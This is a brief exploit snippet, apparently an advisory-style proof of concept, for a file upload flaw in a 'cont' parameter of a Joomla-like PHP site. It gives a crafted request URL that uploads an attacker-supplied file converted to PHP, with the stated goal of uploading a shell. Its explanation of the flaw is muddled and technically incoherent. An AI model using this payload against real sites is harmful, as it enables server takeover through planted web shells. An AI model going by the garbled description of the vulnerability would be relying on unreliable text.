    The vulnerability resides at 'cont' parameter, which is often used for reconnecting the SQL database to the website in-order to gain information that is being provided by the administrator, although, if a few parameters are added as an extention-act, files can be uploaded, and therefore, more risk shall occur.

    http://localhost/index.php?option=com_content&cont=sendfile?controller&attach_file=[FILE LINK]&chformat=php (or any other you want it to change into)

    [x] Uploading a Shell
